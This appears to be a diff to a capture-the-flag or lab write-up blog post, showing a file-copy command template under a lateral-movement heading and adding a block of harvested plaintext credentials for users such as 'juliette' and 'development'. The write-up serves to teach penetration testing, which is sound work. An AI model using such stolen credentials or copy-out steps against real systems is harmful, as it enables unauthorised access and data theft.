@@ -140,6 +140,12 @@ published: true
 <p>scp "file you want to download" user@0.0.0.0:path "Your ip and where you want to download it"</p> 
 
 <h1>Lateral Movment</h1>
+<p>After downloading the files look What i got !</p>
+
+<pre><span class="line">juliette: jUli901./())!</span><br><span class="line">development: fN3)sN5Ee@g</span><br><span class="line">administrator: [MOVED]</span><br></pre>
+
+<img src="https://www.gifcen.com/wp-content/uploads/2021/04/wow-gif-6.gif" alt="sqliite" border="0">
+
 
 
 
